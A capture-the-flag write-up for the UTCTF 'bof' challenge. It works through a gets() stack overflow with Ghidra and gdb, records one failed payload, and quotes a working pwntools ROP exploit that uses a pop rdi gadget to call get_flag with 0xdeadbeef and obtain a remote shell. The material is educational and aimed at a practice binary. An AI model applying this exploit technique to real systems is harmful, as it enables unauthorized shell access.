bof
nc binary.utctf.live 9002

Download the binary "pwnable" and analyze it with ghidra. This is main:

undefined8 main(void)
{
  char local_78 [112];
  
  puts("I really like strings! Please give me a good one!");
  gets(local_78);
  puts("Thanks for the string");
  return 1;
}

(gdb) disass main
Dump of assembler code for function main:
   0x00000000004005b6 <+0>:     push   %rbp
   0x00000000004005b7 <+1>:     mov    %rsp,%rbp
   0x00000000004005ba <+4>:     sub    $0x70,%rsp
   0x00000000004005be <+8>:     mov    $0x4006b8,%edi
   0x00000000004005c3 <+13>:    callq  0x400470 <puts@plt>
   0x00000000004005c8 <+18>:    lea    -0x70(%rbp),%rax
   0x00000000004005cc <+22>:    mov    %rax,%rdi
   0x00000000004005cf <+25>:    mov    $0x0,%eax
   0x00000000004005d4 <+30>:    callq  0x4004a0 <gets@plt>
   0x00000000004005d9 <+35>:    mov    $0x4006ea,%edi
   0x00000000004005de <+40>:    callq  0x400470 <puts@plt>
   0x00000000004005e3 <+45>:    mov    $0x1,%eax
   0x00000000004005e8 <+50>:    leaveq 
   0x00000000004005e9 <+51>:    retq   
End of assembler dump.

Pretty obvious buffer overflow.

user@kali:~/Downloads$ perl -e 'print "A"x120' | ./pwnable 
I really like strings! Please give me a good one!
Thanks for the string
Segmentation fault

We'll need to overwrite the return address with the entry point for this get_flag() function:

void get_flag(int param_1)
{
  char *local_18;
  undefined8 local_10;
  
  if (param_1 == -0x21524111) {
    local_18 = "/bin/sh";
    local_10 = 0;
    execve("/bin/sh",&local_18,(char **)0x0);
  }
  return;
}

(gdb) disass get_flag
Dump of assembler code for function get_flag:
   0x00000000004005ea <+0>:     push   %rbp
   0x00000000004005eb <+1>:     mov    %rsp,%rbp
   0x00000000004005ee <+4>:     sub    $0x20,%rsp
   0x00000000004005f2 <+8>:     mov    %edi,-0x14(%rbp)
   0x00000000004005f5 <+11>:    cmpl   $0xdeadbeef,-0x14(%rbp)
   0x00000000004005fc <+18>:    jne    0x400628 <get_flag+62>
   0x00000000004005fe <+20>:    movq   $0x400700,-0x10(%rbp)
   0x0000000000400606 <+28>:    movq   $0x0,-0x8(%rbp)
   0x000000000040060e <+36>:    mov    -0x10(%rbp),%rax
   0x0000000000400612 <+40>:    lea    -0x10(%rbp),%rcx
   0x0000000000400616 <+44>:    mov    $0x0,%edx
   0x000000000040061b <+49>:    mov    %rcx,%rsi
   0x000000000040061e <+52>:    mov    %rax,%rdi
   0x0000000000400621 <+55>:    callq  0x400490 <execve@plt>
   0x0000000000400626 <+60>:    jmp    0x400629 <get_flag+63>
   0x0000000000400628 <+62>:    nop
   0x0000000000400629 <+63>:    leaveq 
   0x000000000040062a <+64>:    retq   
End of assembler dump.

Let's see what the registers look like when we hit the end of main (0x004005e9).

(gdb) break *0x04005e9
Breakpoint 1 at 0x4005e9
(gdb) run
Starting program: /home/user/Downloads/pwnable 
I really like strings! Please give me a good one!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks for the string

Breakpoint 1, 0x00000000004005e9 in main ()
(gdb) info registers
rax            0x1                 1
rbx            0x0                 0
rcx            0x7ffff7edd924      140737352948004
rdx            0x7ffff7fae580      140737353803136
rsi            0x602260            6300256
rdi            0x0                 0
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7fffffffdc48      0x7fffffffdc48
r8             0x16                22
r9             0x0                 0
r10            0x410               1040
r11            0x246               582
r12            0x4004c0            4195520
r13            0x7fffffffdd20      140737488346400
r14            0x0                 0
r15            0x0                 0
rip            0x4005e9            0x4005e9 <main+51>
eflags         0x246               [ PF ZF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x/40xw $rsp-64
0x7fffffffdc08: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdc18: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdc28: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdc38: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdc48: 0xf7e18b00      0x00007fff      0xf7fa84d8      0x00007fff
0x7fffffffdc58: 0xffffdd28      0x00007fff      0xf7f755a8      0x00000001
0x7fffffffdc68: 0x004005b6      0x00000000      0x00000000      0x00000000
0x7fffffffdc78: 0x08c704ae      0x6169d4d0      0x004004c0      0x00000000
0x7fffffffdc88: 0xffffdd20      0x00007fff      0x00000000      0x00000000
0x7fffffffdc98: 0x00000000      0x00000000      0xbc0704ae      0x9e962baf

We have to overwrite rbp with 0xdeadbeef to execute /bin/sh, and right now it's filled with A's (0x41). Fill it with deadbeef instead.
The return address that we need to overwrite looks like it's at 0x7fffffffdc48 (rsp).
We need to replace that return address with 0x004005ea to invoke get_flag().
Set a breakpoint on get_flag() so we know when we've hit it.

user@kali:~/Downloads$ perl -e 'print "\xef\xbe\xad\xde\x00\x00\x00\x00"x15 . "\xea\x05\x40\x00\x00\x00\x00\x00"' > pwnit 

(gdb) break *0x0000000000400621
Note: breakpoint 4 also set at pc 0x400621.
Breakpoint 6 at 0x400621
(gdb) run < pwnit
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/Downloads/pwnable < pwnit
I really like strings! Please give me a good one!
Thanks for the string

Breakpoint 1, 0x00000000004005e9 in main ()
(gdb) disass
Dump of assembler code for function main:
   0x00000000004005b6 <+0>:     push   %rbp
   0x00000000004005b7 <+1>:     mov    %rsp,%rbp
   0x00000000004005ba <+4>:     sub    $0x70,%rsp
   0x00000000004005be <+8>:     mov    $0x4006b8,%edi
   0x00000000004005c3 <+13>:    callq  0x400470 <puts@plt>
   0x00000000004005c8 <+18>:    lea    -0x70(%rbp),%rax
   0x00000000004005cc <+22>:    mov    %rax,%rdi
   0x00000000004005cf <+25>:    mov    $0x0,%eax
   0x00000000004005d4 <+30>:    callq  0x4004a0 <gets@plt>
   0x00000000004005d9 <+35>:    mov    $0x4006ea,%edi
   0x00000000004005de <+40>:    callq  0x400470 <puts@plt>
   0x00000000004005e3 <+45>:    mov    $0x1,%eax
   0x00000000004005e8 <+50>:    leaveq
=> 0x00000000004005e9 <+51>:    retq
End of assembler dump.
(gdb) cont
Continuing.

Breakpoint 2, 0x00000000004005ea in get_flag ()
(gdb) disass
Dump of assembler code for function get_flag:
=> 0x00000000004005ea <+0>:     push   %rbp
   0x00000000004005eb <+1>:     mov    %rsp,%rbp
   0x00000000004005ee <+4>:     sub    $0x20,%rsp
   0x00000000004005f2 <+8>:     mov    %edi,-0x14(%rbp)
   0x00000000004005f5 <+11>:    cmpl   $0xdeadbeef,-0x14(%rbp)
   0x00000000004005fc <+18>:    jne    0x400628 <get_flag+62>
   0x00000000004005fe <+20>:    movq   $0x400700,-0x10(%rbp)
   0x0000000000400606 <+28>:    movq   $0x0,-0x8(%rbp)
   0x000000000040060e <+36>:    mov    -0x10(%rbp),%rax
   0x0000000000400612 <+40>:    lea    -0x10(%rbp),%rcx
   0x0000000000400616 <+44>:    mov    $0x0,%edx
   0x000000000040061b <+49>:    mov    %rcx,%rsi
   0x000000000040061e <+52>:    mov    %rax,%rdi
   0x0000000000400621 <+55>:    callq  0x400490 <execve@plt>
   0x0000000000400626 <+60>:    jmp    0x400629 <get_flag+63>
   0x0000000000400628 <+62>:    nop
   0x0000000000400629 <+63>:    leaveq
   0x000000000040062a <+64>:    retq
End of assembler dump.
(gdb) info reg
rax            0x1                 1
rbx            0x0                 0
rcx            0x7ffff7edd924      140737352948004
rdx            0x7ffff7fae580      140737353803136
rsi            0x602260            6300256
rdi            0x0                 0
rbp            0xdeadbeef          0xdeadbeef
rsp            0x7fffffffdc50      0x7fffffffdc50
r8             0x16                22
r9             0x0                 0
r10            0x0                 0
r11            0x246               582
r12            0x4004c0            4195520
r13            0x7fffffffdd20      140737488346400
r14            0x0                 0
r15            0x0                 0
rip            0x4005ea            0x4005ea <get_flag>
eflags         0x246               [ PF ZF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x/40xw $rsp-16
0x7fffffffdc40: 0xdeadbeef      0x00000000      0x004005ea      0x00000000
0x7fffffffdc50: 0xf7fa8400      0x00007fff      0xffffdd28      0x00007fff
0x7fffffffdc60: 0xf7f755a8      0x00000001      0x004005b6      0x00000000
0x7fffffffdc70: 0x00000000      0x00000000      0x2eac244b      0x6e8b15d2
0x7fffffffdc80: 0x004004c0      0x00000000      0xffffdd20      0x00007fff
0x7fffffffdc90: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdca0: 0x9a6c244b      0x9174eaad      0x342a244b      0x9174fa91
0x7fffffffdcb0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcc0: 0x00000000      0x00000000      0xffffdd38      0x00007fff
0x7fffffffdcd0: 0xf7ffe190      0x00007fff      0xf7fe46b9      0x00007fff
(gdb) cont
Continuing.

Breakpoint 3, 0x00000000004005f5 in get_flag ()
(gdb) disass
Dump of assembler code for function get_flag:
   0x00000000004005ea <+0>:     push   %rbp
   0x00000000004005eb <+1>:     mov    %rsp,%rbp
   0x00000000004005ee <+4>:     sub    $0x20,%rsp
   0x00000000004005f2 <+8>:     mov    %edi,-0x14(%rbp)
=> 0x00000000004005f5 <+11>:    cmpl   $0xdeadbeef,-0x14(%rbp)
   0x00000000004005fc <+18>:    jne    0x400628 <get_flag+62>
   0x00000000004005fe <+20>:    movq   $0x400700,-0x10(%rbp)
   0x0000000000400606 <+28>:    movq   $0x0,-0x8(%rbp)
   0x000000000040060e <+36>:    mov    -0x10(%rbp),%rax
   0x0000000000400612 <+40>:    lea    -0x10(%rbp),%rcx
   0x0000000000400616 <+44>:    mov    $0x0,%edx
   0x000000000040061b <+49>:    mov    %rcx,%rsi
   0x000000000040061e <+52>:    mov    %rax,%rdi
   0x0000000000400621 <+55>:    callq  0x400490 <execve@plt>
   0x0000000000400626 <+60>:    jmp    0x400629 <get_flag+63>
   0x0000000000400628 <+62>:    nop
   0x0000000000400629 <+63>:    leaveq 
   0x000000000040062a <+64>:    retq   
End of assembler dump.
(gdb) x/40xw $rbp
0x7fffffffdc48: 0xdeadbeef      0x00000000      0xf7fa8400      0x00007fff
0x7fffffffdc58: 0xffffdd28      0x00007fff      0xf7f755a8      0x00000001
0x7fffffffdc68: 0x004005b6      0x00000000      0x00000000      0x00000000
0x7fffffffdc78: 0x2eac244b      0x6e8b15d2      0x004004c0      0x00000000
0x7fffffffdc88: 0xffffdd20      0x00007fff      0x00000000      0x00000000
0x7fffffffdc98: 0x00000000      0x00000000      0x9a6c244b      0x9174eaad
0x7fffffffdca8: 0x342a244b      0x9174fa91      0x00000000      0x00000000
0x7fffffffdcb8: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcc8: 0xffffdd38      0x00007fff      0xf7ffe190      0x00007fff
0x7fffffffdcd8: 0xf7fe46b9      0x00007fff      0x00000000      0x00000000
(gdb) cont
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7fa8400 in ?? ()

Well crap, it looks like the deadbeef comparison should have passed...
but it never triggered execve(), so the comparison must have failed.
It just jumps to the end of the function and returns to 0x00007ffff7fa8400 ?
Close, but no cigar. I ran this by Egan and he shared his solution:

egan  5:55 PM
```
from pwn import *
import sys
binary = ELF('./pwnable')
get_flag = binary.symbols['get_flag']
print("get_flag: " + str(hex(get_flag)))
rop = 0x0000000000400693
payload = ''
payload += (112) * 'A'
payload += 8 * 'B'
payload += p64(rop)
payload += p64(0xdeadbeef)
payload += p64(get_flag)
p = remote('binary.utctf.live',9002)
p.sendline(payload)
p.interactive()
```
5:56
there's a get_flag sub that you can redirect the IP to, however it needs to have an argument of 0xdeadbeef, with x86_64 the first arg to a sub is in reg rdi, so you need to find a rop gadget to pop rdi; ret first before calling get_flag
5:57
```
# ropper --file pwnable --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi
[INFO] File: pwnable
0x0000000000400693: pop rdi; ret;
```
5:57
checksec on this binary does not have NX set, so you can use absolute rop and other addresses
when the function starts it will take rdi and write to stack, overwriting anything you put in the stack :-)

